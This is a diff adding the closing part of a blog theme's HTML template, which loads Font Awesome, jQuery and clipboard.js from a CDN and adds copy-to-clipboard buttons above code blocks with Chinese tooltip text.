+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
